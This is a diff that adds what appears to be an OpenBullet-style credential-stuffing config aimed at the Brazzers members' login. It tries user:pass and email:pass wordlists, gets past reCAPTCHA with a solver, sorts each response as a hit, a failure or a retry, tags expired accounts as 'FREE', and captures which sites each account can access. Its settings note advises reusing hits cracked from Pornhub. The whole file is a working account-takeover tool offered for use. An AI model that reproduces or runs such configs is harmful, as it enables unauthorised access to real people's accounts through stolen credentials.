@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Brazzers",
+  "SuggestedBots": 10,
+  "LastModified": "2018-06-01T23:10:16.7218742+00:00",
+  "AdditionalInfo": "Maybe crack pornhub first and then try the hits here",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://ma.brazzers.com/access/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://ma.brazzers.com/access/login/" "6LeY4gsUAAAAANITYkv2gPI8eEu8am3TCOr4B6j7" -> VAR "RECAP" 
+#LOGIN REQUEST POST "https://ma.brazzers.com/access/submit/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>&rememberme=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://ma.brazzers.com/access/login/" 
+  HEADER "origin: https://ma.brazzers.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY ">Login Error</" 
+  KEYCHAIN Success OR 
+    KEY "Fallback Procedure - Brazzers" 
+  KEYCHAIN Retry OR 
+    KEY "Please fill out the reCAPTCHA" 
+#PARSE_RESPONSE PARSE "<SOURCE>" CSS "[name=response]" "value" 0 -> VAR "RESPONSE" "" "" 
+#FALLBACK REQUEST POST "https://ma.brazzers.com/access/success/?postFallback=1" AutoRedirect=TRUE 
+  CONTENT "response=<RESPONSE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: http://probiller.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<h1>Renew</h1>" 
+#PARSE_URL PARSE "<SOURCE>" LR "data: '" "'" Recursive=FALSE -> VAR "URL" "" "" 
+#GET_PORNPORTAL_DATA REQUEST GET "https://ppp.contentdef.com/postlogin?data=<URL>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CAPTURE_SITES PARSE "<SOURCE>" LR "PPBAR-brazzers-ContinueToProduct-" "\"" Recursive=TRUE -> CAP "Site" "" "" 
